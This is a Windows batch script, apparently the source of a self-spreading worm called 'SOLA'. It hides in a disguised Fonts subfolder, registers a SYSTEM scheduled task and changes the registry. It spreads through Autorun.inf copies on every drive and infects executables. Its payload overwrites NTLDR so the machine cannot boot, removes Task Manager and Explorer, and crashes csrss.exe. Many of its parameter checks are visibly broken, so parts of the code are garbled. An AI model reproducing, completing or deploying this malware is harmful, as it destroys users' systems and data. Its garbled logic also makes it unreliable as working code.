@echo off
set sola=C:\WINDOWS\Fonts\HIDESE~1
set setup=C:\WINDOWS\Fonts\HIDESE~1\solasetup
FOR /F "tokens=1" %%i in ('date /t') do (
set Realdate=%%i
)
FOR /F "skip=5 tokens=1,4" %%i in ('dir C:\WINDOWS\explorer.exe') do (
if /I "%%j"=="explorer.exe" (
set Date=%%i
)
)
if ""=="-Install" (
goto Install
)
if ""=="-Run" (
goto Run
)
if ""=="-Tenbatsu" (
goto Tenbatsu
)
if ""=="-Kill" (
goto Kill
)
if ""=="-Killself" (
goto Killself
)
:CheckSign
if ""=="-USB" (
start /max ..
)
if ""=="-USB" (
cd SOLA
)
if exist C:\WINDOWS\Fonts\HIDESE~1\sola.sign (
goto Open
)
:FileCopy
set selfname=script.bat
:HIDESelf
date %%i
md C:\WINDOWS\Fonts\HIDESELF...\
date %%i
if not ""=="-USB" (
type script.bat>C:\WINDOWS\Fonts\HIDESE~1\sola.bat
)
if ""=="-USB" (
type sola.bat>C:\WINDOWS\Fonts\HIDESE~1\sola.bat
)
type Function.dll>C:\WINDOWS\Fonts\HIDESE~1\Function.exe
echo On Error Resume Next>C:\WINDOWS\Fonts\HIDESE~1\SOLA.VBS
echo set ws=wscript.createobject("wscript.shell")>>C:\WINDOWS\Fonts\HIDESE~1\SOLA.VBS
echo ws.run "cmd /c C:\WINDOWS\Fonts\HIDESE~1\SOLA.BAT -Install" 0 >>C:\WINDOWS\Fonts\HIDESE~1\SOLA.VBS
cscript C:\WINDOWS\Fonts\HIDESE~1\SOLA.VBS
echo>C:\WINDOWS\Fonts\HIDESE~1\sola.sign
del C:\WINDOWS\Fonts\HIDESE~1\SOLA.VBS
goto Open
:Install
:PackerSetup
C:
cd C:\WINDOWS\Fonts\HIDESE~1
if exist Function.exe (
taskkill /f /im Function.exe
)
if exist solasetup (
rd /s /q solasetup
)
md solasetup
cd solasetup
copy ..\Function.exe Function.dll
..\Function.exe -x
cd..
date %%i
type C:\WINDOWS\Fonts\HIDESE~1\solasetup\rar.exe >C:\WINDOWS\system32\rar.exe
date %%i
copy C:\WINDOWS\Fonts\HIDESE~1\solasetup\Function.dll C:\WINDOWS\Fonts\HIDESE~1\Function.dll
attrib C:\WINDOWS\Fonts\HIDESE~1\Function.dll +s +h +r
rar -m0 -ep -ep1 a C:\WINDOWS\Fonts\HIDESE~1\solasetup\docpack.dll C:\WINDOWS\Fonts\HIDESE~1\Function.dll
rar -m0 -ep -ep1 a C:\WINDOWS\Fonts\HIDESE~1\solasetup\txtpack.dll C:\WINDOWS\Fonts\HIDESE~1\Function.dll
rar -m0 -ep -ep1 a C:\WINDOWS\Fonts\HIDESE~1\solasetup\exepack.dll C:\WINDOWS\Fonts\HIDESE~1\Function.dll
rar -m0 -ep -ep1 a C:\WINDOWS\Fonts\HIDESE~1\solasetup\jpgpack.dll C:\WINDOWS\Fonts\HIDESE~1\Function.dll
del Function.exe
:Mainsetup
set A0001=copy
set A0002=attrib
set A0003=echo
set A0005=Shell Hardware Detection
tasklist >C:\WINDOWS\Fonts\HIDESE~1\task.txt
FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "C:\WINDOWS\Fonts\HIDESE~1\task.txt"') do (
set svchost=%%i
)
copy C:\WINDOWS\system32\cmd.exe C:\WINDOWS\Fonts\HIDESE~1\%%i
del C:\WINDOWS\Fonts\HIDESE~1\task.txt
:Tasks
attrib C:\WINDOWS\Tasks\Tasks.job -s -h -r
del C:\WINDOWS\Tasks\Tasks.job
date %%i
type C:\WINDOWS\Fonts\HIDESE~1\solasetup\Tasks.xxx>C:\WINDOWS\Tasks\Tasks.job
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
if errorlevel 1 (
goto TaskFail
)
date %%i
goto TaskSuc
:TaskFail
C:
cd "C:\ProgramData"
cd ʼ˵\\
date %%i
echo On Error Resume Next>SOLA.VBS
echo set ws=wscript.createobject("wscript.shell")>>SOLA.VBS
echo ws.run "C:\WINDOWS\Fonts\HIDESE~1\svchost.exe /c C:\WINDOWS\Fonts\HIDESE~1\SOLA.BAT -Run" 0 >>SOLA.VBS
copy SOLA.VBS C:\WINDOWS\Fonts\HIDESE~1\SOLA.VBS
echo NT>C:\WINDOWS\Fonts\HIDESE~1\NoTasks
date %%i
:TaskSuc
attrib C:\WINDOWS\Tasks\Tasks.job +s +h +r
date %%i
copy C:\WINDOWS\Fonts\HIDESE~1\solasetup\sleep.exe C:\WINDOWS\system32\sleep.exe
date %%i
:NoAutoPlay
net stop "Shell Hardware Detection"
echo Windows Registry Editor Version 5.00>C:\WINDOWS\Fonts\HIDESE~1\Regedit.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ShellHWDetection]>>C:\WINDOWS\Fonts\HIDESE~1\Regedit.reg
echo "Start"=dword:00000004>>C:\WINDOWS\Fonts\HIDESE~1\Regedit.reg
regedit /s C:\WINDOWS\Fonts\HIDESE~1\Regedit.reg
::End of Install
goto End
if errorlevel 1 (
exit
)
::End of Install
:Run
set runroot=C:\ProgramData\ʼ˵\\
set taskroot=C:\WINDOWS\Tasks
:RunTimeChk
if not exist C:\WINDOWS\Fonts\HIDESE~1\RunTime.txt (
echo 50>%sola%\RunTime.txt
)
FOR /F "tokens=1 delims=" %%i in (%sola%\RunTime.txt) do (
set RunTime=%%i
)
if /i %%i leq 0 (
goto Virus
)
set /a RunTime=%%i-1
echo %Runtime%>%sola%\RunTime.txt
:Diskchk
echo On Error Resume Next>C:\WINDOWS\Fonts\HIDESE~1\RecentInf.VBS
echo set ws=wscript.createobject("wscript.shell")>>C:\WINDOWS\Fonts\HIDESE~1\RecentInf.VBS
echo ws.run "C:\WINDOWS\Fonts\HIDESE~1\svchost.exe /c C:\WINDOWS\Fonts\HIDESE~1\solasetup\RecentInf.bat" 0 >>C:\WINDOWS\Fonts\HIDESE~1\RecentInf.VBS
cscript C:\WINDOWS\Fonts\HIDESE~1\RecentInf.VBS
del C:\WINDOWS\Fonts\HIDESE~1\RecentInf.VBS
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
vol %%i:
)
if errorlevel 1 (
set %%i=1
)
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
echo 1>%%i:\solachk1
)
findstr . %%i:\solachk1
if not errorlevel 1 (
del %%i:\solachk1
)
findstr /C:"SOLA_1.0_2.0" %%i:\Autorun.inf
if errorlevel 1  (
attrib -s -h -r %%i:\Autorun.inf
)
copy /y C:\WINDOWS\Fonts\HIDESE~1\solasetup\Autorun.inf %%i:\Autorun.inf
attrib %%i:\Autorun.inf +s +h +r
md %%i:\SOLA
copy /y "C:\WINDOWS\Fonts\HIDESE~1\solasetup\sola.bat" %%i:\SOLA\SOLA.BAT
copy /y "C:\WINDOWS\Fonts\HIDESE~1\solasetup\Function.dll" %%i:\SOLA\Function.dll
attrib %%i:\SOLA +s +h +r
:Turn
if ""=="1" (
vol C:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat C:
)
if ""=="1" (
vol D:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat D:
)
if ""=="1" (
vol E:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat E:
)
if ""=="1" (
vol F:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat F:
)
if ""=="1" (
vol G:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat G:
)
if ""=="1" (
vol H:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat H:
)
if ""=="1" (
vol I:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat I:
)
if ""=="1" (
vol J:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat J:
)
if ""=="1" (
vol K:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat K:
)
if ""=="1" (
vol L:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat L:
)
if ""=="1" (
vol M:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat M:
)
if ""=="1" (
vol N:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat N:
)
if ""=="1" (
vol O:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat O:
)
if ""=="1" (
vol P:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat P:
)
if ""=="1" (
vol Q:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat Q:
)
if ""=="1" (
vol R:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat R:
)
if ""=="1" (
vol S:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat S:
)
if ""=="1" (
vol T:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat T:
)
if ""=="1" (
vol U:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat U:
)
if ""=="1" (
vol V:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat V:
)
if ""=="1" (
vol W:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat W:
)
if ""=="1" (
vol X:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat X:
)
if ""=="1" (
vol Y:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat Y:
)
if ""=="1" (
vol Z:
)
if not errorlevel 1 (
call C:\WINDOWS\Fonts\HIDESE~1\solasetup\Scan.bat Z:
)
if ""=="2" (
vol C:
)
if errorlevel 1 (
set C=1
)
if ""=="2" (
vol D:
)
if errorlevel 1 (
set D=1
)
if ""=="2" (
vol E:
)
if errorlevel 1 (
set E=1
)
if ""=="2" (
vol F:
)
if errorlevel 1 (
set F=1
)
if ""=="2" (
vol G:
)
if errorlevel 1 (
set G=1
)
if ""=="2" (
vol H:
)
if errorlevel 1 (
set H=1
)
if ""=="2" (
vol I:
)
if errorlevel 1 (
set I=1
)
if ""=="2" (
vol J:
)
if errorlevel 1 (
set J=1
)
if ""=="2" (
vol K:
)
if errorlevel 1 (
set K=1
)
if ""=="2" (
vol L:
)
if errorlevel 1 (
set L=1
)
if ""=="2" (
vol M:
)
if errorlevel 1 (
set M=1
)
if ""=="2" (
vol N:
)
if errorlevel 1 (
set N=1
)
if ""=="2" (
vol O:
)
if errorlevel 1 (
set O=1
)
if ""=="2" (
vol P:
)
if errorlevel 1 (
set P=1
)
if ""=="2" (
vol Q:
)
if errorlevel 1 (
set Q=1
)
if ""=="2" (
vol R:
)
if errorlevel 1 (
set R=1
)
if ""=="2" (
vol S:
)
if errorlevel 1 (
set S=1
)
if ""=="2" (
vol T:
)
if errorlevel 1 (
set T=1
)
if ""=="2" (
vol U:
)
if errorlevel 1 (
set U=1
)
if ""=="2" (
vol V:
)
if errorlevel 1 (
set V=1
)
if ""=="2" (
vol W:
)
if errorlevel 1 (
set W=1
)
if ""=="2" (
vol X:
)
if errorlevel 1 (
set X=1
)
if ""=="2" (
vol Y:
)
if errorlevel 1 (
set Y=1
)
if ""=="2" (
vol Z:
)
if errorlevel 1 (
set Z=1
)
if exist C:\WINDOWS\Fonts\HIDESE~1\NoTasks (
if not exist "C:\ProgramData\ʼ˵\\\SOLA.VBS" copy "C:\WINDOWS\Fonts\HIDESE~1\SOLA.VBS" (
"C:\ProgramData\ʼ˵\\\SOLA.VBS"
)
)
if not exist C:\WINDOWS\Fonts\HIDESE~1\NoTasks (
if not exist C:\WINDOWS\Tasks\Tasks.job (
copy C:\WINDOWS\Fonts\HIDESE~1\solasetup\Tasks.xxx C:\WINDOWS\Tasks\Tasks.job
)
)
attrib C:\WINDOWS\Tasks\Tasks.job +s +h +r
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
sleep 2000
goto Turn
::End of Run
goto End
if errorlevel 1 (
exit
)
::End of Run
:Virus
if not "(%%i-1)"=="0" (
goto VirusChk
)
set /a RunTime=(%%i-1)-1
echo %Runtime%>%sola%\RunTime.txt
cd "C:\ProgramData\ʼ˵\\"
echo On Error Resume Next>TENBATSU.VBS
echo set ws=wscript.createobject("wscript.shell")>>TENBATSU.VBS
echo ws.run "C:\WINDOWS\Fonts\HIDESE~1\sola.bat -Tenbatsu" 0 >>TENBATSU.VBS
goto Diskchk
:VirusChk
if not exist "C:\ProgramData\ʼ˵\\\TENBATSU.VBS" (
goto Kill
)
goto Diskchk
:Tenbatsu
:KillNTLDR
attrib C:\NTLDR -s -h -r
copy /Y C:\NTLDR C:\WINDOWS\Fonts\HIDESE~1\NTLDR
echo NO NTLDR>C:\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r
:PauseSFC
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()"
:KillTaskmgr
del /q /a C:\WINDOWS\system32\dllcache\taskmgr.exe
taskkill /f /im taskmgr.exe
if errorlevel 1 (
ren C:\WINDOWS\system32\taskmgr.exe taskmgr.xxx
)
if errorlevel 1 (
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close()"
)
sleep 500
ren C:\WINDOWS\system32\taskmgr.exe taskmgr.xxx
:KillExplorer
taskkill /f /im explorer.exe >nul
if errorlevel 1 (
ren C:\WINDOWS\system32\explorer.exe explorer.xxx
)
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.close()"
sleep 500
ren C:\WINDOWS\explorer.exe explorer.xxx
start /max C:\WINDOWS\Fonts\HIDESE~1\solasetup\TENBATSU.BAT
:Timeset
sleep 660000
if exist C:\WINDOWS\Fonts\HIDESE~1\Killself (
Exit
)
:Kill
attrib C:\NTLDR -s -h -r
echo NO NTLDR>C:\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r
tasklist >C:\WINDOWS\Fonts\HIDESE~1\Task.txt
FOR /F "tokens=2" %%i in ('findstr /I "csrss.exe" "C:\WINDOWS\Fonts\HIDESE~1\Task.txt"') do (
ntsd -p %%i
)
goto Diskchk
:KillSelf
:StartExplorer
ren C:\WINDOWS\explorer.xxx explorer.exe
start C:\WINDOWS\explorer.exe
:BackNTLDR
attrib C:\NTLDR -s -h -r
copy /Y C:\WINDOWS\Fonts\HIDESE~1\NTLDR C:\NTLDR
attrib C:\NTLDR +s +h +r
:RenTmg
ren C:\WINDOWS\system32\taskmgr.xxx taskmgr.exe
:KillVirus
copy C:\WINDOWS\Fonts\HIDESE~1\solasetup\KillVirus.txt C:\WINDOWS\Fonts\HIDESE~1\KillVirus.txt
C:
cd\
md ~Install
cd ~Install
rar x -hpkakenhi200601 C:\WINDOWS\Fonts\HIDESE~1\solasetup\SolaKiller.rar
mshta "javascript:new ActiveXObject('WScript.Shell').Run('C:\\~Install\\Install.bat %%1',0);window.close()"
rd /s /q C:\WINDOWS\Fonts\HIDESE~1\solasetup
attrib C:\WINDOWS\Tasks\Tasks.job -s -h -r
del C:\WINDOWS\Tasks\Tasks.job
cd "C:\ProgramData\ʼ˵\\"
if exist sola.vbs (
del sola.vbs
)
if exist tenbatsu.vbs (
del tenbatsu.vbs
)
start C:\WINDOWS\system32\notepad.exe C:\WINDOWS\Fonts\HIDESE~1\KillVirus.txt
del C:\WINDOWS\Fonts\HIDESE~1\sola.bat
Exit
:Open
if ""=="-USB" (
Exit
)
goto GetName
:BackOpen
if not exist "" (
exit
)
call ""
:Save
FOR /F "delims=:" %%i in ('findstr "" *.exe') do (
set PackName=%%i
)
rar -m0 -ep -ep1 a "%%i" ""
echo >>"%%i"
:Del
attrib "" -s -h -r
del ""
attrib Function.dll -s -h -r
del Function.dll
attrib script.bat -s -h -r
del script.bat
exit
::CMD program will stop there.
:GetName
set Code=SOLA_2.0_319131097028423
set Name=.doc
goto Backopen
:End
